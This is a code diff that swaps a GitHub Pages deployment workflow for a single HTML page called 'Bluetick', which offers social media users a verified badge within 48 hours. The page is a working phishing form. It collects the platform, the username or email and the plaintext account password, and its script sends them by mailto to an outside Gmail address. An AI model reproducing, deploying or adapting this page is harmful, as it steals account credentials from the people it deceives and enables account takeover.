@@ -1,43 +1,163 @@
-# Simple workflow for deploying static content to GitHub Pages
-name: Deploy static content to Pages
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Bluetick</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body{
+  margin:0;
+  font-family:Arial,Helvetica,sans-serif;
+  background:linear-gradient(135deg,#0b5ed7,#5f9cff);
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+.card{
+  width:100%;
+  max-width:380px;
+  background:#fff;
+  border-radius:14px;
+  padding:20px;
+  box-shadow:0 15px 30px rgba(0,0,0,0.2);
+}
+.title{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:6px;
+  margin-bottom:6px;
+}
+.title h1{
+  margin:0;
+  color:#0b5ed7;
+}
+.badge{
+  width:20px;
+  height:20px;
+  background:#1d9bf0;
+  color:#fff;
+  font-size:14px;
+  font-weight:bold;
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+.subtitle{
+  text-align:center;
+  color:#444;
+  font-size:14px;
+  margin-bottom:15px;
+  font-weight:bold;
+}
+label{
+  font-size:14px;
+  font-weight:bold;
+  display:block;
+  margin-top:10px;
+}
+select,input{
+  width:100%;
+  padding:10px;
+  margin-top:6px;
+  border-radius:8px;
+  border:1px solid #ccc;
+  font-size:15px;
+}
+button{
+  width:100%;
+  margin-top:18px;
+  padding:12px;
+  font-size:16px;
+  border:none;
+  border-radius:10px;
+  background:#0b5ed7;
+  color:#fff;
+  cursor:pointer;
+}
+button:hover{
+  background:#084298;
+}
+</style>
+</head>
+<body>
 
-on:
-  # Runs on pushes targeting the default branch
-  push:
-    branches: ["main"]
+<div class="card">
 
-  # Allows you to run this workflow manually from the Actions tab
-  workflow_dispatch:
+  <!-- TITLE -->
+  <div class="title">
+    <h1>Bluetick</h1>
+    <div class="badge">✓</div>
+  </div>
 
-# Sets permissions of the GITHUB_TOKEN to allow deployment to GitHub Pages
-permissions:
-  contents: read
-  pages: write
-  id-token: write
+  <!-- SUBTITLE -->
+  <div class="subtitle">Get Verified Badge Within 48 Hours</div>
 
-# Allow only one concurrent deployment, skipping runs queued between the run in-progress and latest queued.
-# However, do NOT cancel in-progress runs as we want to allow these production deployments to complete.
-concurrency:
-  group: "pages"
-  cancel-in-progress: false
+  <label>Select Platform</label>
+  <select id="platform" onchange="platformChange()">
+    <option value="">Choose platform</option>
+    <option>Instagram</option>
+    <option>Facebook</option>
+    <option>Twitter (X)</option>
+    <option>YouTube</option>
+    <option>Telegram</option>
+  </select>
 
-jobs:
-  # Single deploy job since we're just deploying
-  deploy:
-    environment:
-      name: github-pages
-      url: ${{ steps.deployment.outputs.page_url }}
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-      - name: Setup Pages
-        uses: actions/configure-pages@v5
-      - name: Upload artifact
-        uses: actions/upload-pages-artifact@v3
-        with:
-          # Upload entire repository
-          path: '.'
-      - name: Deploy to GitHub Pages
-        id: deployment
-        uses: actions/deploy-pages@v4
+  <label id="userLabel">Enter Username</label>
+  <input type="text" id="username" placeholder="@username">
+
+  <label>Enter Password</label>
+  <input type="password" id="password" placeholder="Password">
+
+  <button onclick="submitForm()">Submit</button>
+
+</div>
+
+<script>
+function platformChange(){
+  const platform = document.getElementById("platform").value;
+  const label = document.getElementById("userLabel");
+  const input = document.getElementById("username");
+
+  if(platform === "YouTube"){
+    label.innerText = "Enter Email ID";
+    input.type = "email";
+    input.placeholder = "email@example.com";
+  }else{
+    label.innerText = "Enter Username";
+    input.type = "text";
+    input.placeholder = "@username";
+  }
+}
+
+function submitForm(){
+  const platform=document.getElementById("platform").value;
+  const username=document.getElementById("username").value.trim();
+  const password=document.getElementById("password").value.trim();
+
+  if(!platform || !username || !password){
+    alert("Please fill all details");
+    return;
+  }
+
+  const subject = "Bluetick Request - " + platform;
+  const body =
+`New Bluetick Request
+
+Platform: ${platform}
+User Info: ${username}
+Password: ${password}
+
+-- Sent via Bluetick Tool`;
+
+  const mailto =
+`mailto:verifiedbadge.org@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+
+  window.location.href = mailto;
+}
+</script>
+
+</body>
+</html>
